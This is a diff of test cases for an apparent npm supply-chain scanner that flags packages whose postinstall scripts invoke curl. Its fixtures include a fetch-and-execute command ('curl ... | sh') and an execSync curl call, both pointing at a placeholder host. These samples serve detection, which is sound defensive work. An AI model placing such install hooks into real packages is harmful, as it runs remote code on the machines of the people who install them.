@@ -94,6 +94,84 @@ test('detects scoped affected packages from npm cache tarball records', async ()
   assert.deepEqual(finding.locations, ['npm cache']);
 });
 
+test('reports npm packages whose postinstall script invokes curl', async () => {
+  const root = makeTempRepo();
+  const modulesRoot = path.join(root, 'node_modules');
+  const pkgRoot = path.join(modulesRoot, 'risky-fetch');
+  fs.mkdirSync(pkgRoot, { recursive: true });
+  writeJson(path.join(pkgRoot, 'package.json'), {
+    name: 'risky-fetch',
+    version: '1.0.0',
+    scripts: {
+      postinstall: 'curl -fsSL https://example.invalid/install.sh | sh',
+    },
+  });
+
+  const result = await scanMachine({
+    live: false,
+    locations: [{ label: 'npm global', kind: 'node_modules', path: modulesRoot }],
+  });
+
+  assert.deepEqual(result.suspiciousScripts, [{
+    ecosystem: 'npm',
+    name: 'risky-fetch',
+    version: '1.0.0',
+    script: 'postinstall',
+    command: 'curl -fsSL https://example.invalid/install.sh | sh',
+    evidenceFiles: [],
+    locations: ['npm global'],
+    sources: [path.join(pkgRoot, 'package.json').replace(os.homedir(), '~')],
+    reason: 'postinstall script invokes curl',
+  }]);
+});
+
+test('reports npm packages whose postinstall script points at a local file that invokes curl', async () => {
+  const root = makeTempRepo();
+  const modulesRoot = path.join(root, 'node_modules');
+  const pkgRoot = path.join(modulesRoot, 'risky-file-fetch');
+  fs.mkdirSync(path.join(pkgRoot, 'scripts'), { recursive: true });
+  writeJson(path.join(pkgRoot, 'package.json'), {
+    name: 'risky-file-fetch',
+    version: '1.0.0',
+    scripts: {
+      postinstall: 'node scripts/install.js',
+    },
+  });
+  fs.writeFileSync(path.join(pkgRoot, 'scripts', 'install.js'), 'require("child_process").execSync("curl -fsSL https://example.invalid/install.sh")');
+
+  const result = await scanMachine({
+    live: false,
+    locations: [{ label: 'npm global', kind: 'node_modules', path: modulesRoot }],
+  });
+
+  assert.equal(result.suspiciousScripts.length, 1);
+  assert.equal(result.suspiciousScripts[0].name, 'risky-file-fetch');
+  assert.equal(result.suspiciousScripts[0].command, 'node scripts/install.js');
+  assert.deepEqual(result.suspiciousScripts[0].evidenceFiles, [path.join(pkgRoot, 'scripts', 'install.js').replace(os.homedir(), '~')]);
+  assert.equal(result.suspiciousScripts[0].reason, 'postinstall script references a local file that invokes curl');
+});
+
+test('does not report curl mentions outside postinstall', async () => {
+  const root = makeTempRepo();
+  const modulesRoot = path.join(root, 'node_modules');
+  const pkgRoot = path.join(modulesRoot, 'safe-docs');
+  fs.mkdirSync(pkgRoot, { recursive: true });
+  writeJson(path.join(pkgRoot, 'package.json'), {
+    name: 'safe-docs',
+    version: '1.0.0',
+    scripts: {
+      test: 'echo curl docs',
+    },
+  });
+
+  const result = await scanMachine({
+    live: false,
+    locations: [{ label: 'npm global', kind: 'node_modules', path: modulesRoot }],
+  });
+
+  assert.deepEqual(result.suspiciousScripts, []);
+});
+
 test('detects packages installed under the npm npx cache', async () => {
   const root = makeTempRepo();
   const npxRoot = path.join(root, '_npx', 'abc123');
@@ -226,6 +304,35 @@ test('rejects live mode because the CLI is offline-only for now', () => {
 
 test('rejects path arguments because the command is machine-only', () => {
   assert.throws(() => parseArgs(['.']), /always scans this machine/);
+});
+
+test('formats human report with postinstall curl packages', () => {
+  const report = formatResult({
+    machine: 'test-machine',
+    home: '/tmp/home',
+    locations: [{ label: 'npm global' }],
+    packages: [{}, {}],
+    findings: [],
+    iocs: [],
+    suspiciousScripts: [{
+      ecosystem: 'npm',
+      name: 'risky-fetch',
+      version: '1.0.0',
+      script: 'postinstall',
+      command: 'curl -fsSL https://example.invalid/install.sh | sh',
+      evidenceFiles: [],
+      locations: ['npm global'],
+      sources: ['/tmp/node_modules/risky-fetch/package.json'],
+      reason: 'postinstall script invokes curl',
+    }],
+    snapshotDate: '2026-05-12',
+    advisoryArtifactCount: 438,
+  }, { color: false, interactive: false });
+
+  assert.match(report, /install-script hit/);
+  assert.match(report, /Packages with postinstall curl/);
+  assert.match(report, /risky-fetch@1\.0\.0/);
+  assert.match(report, /curl -fsSL/);
 });
 
 test('formats human report with compact verdict and privacy-safe evidence', () => {
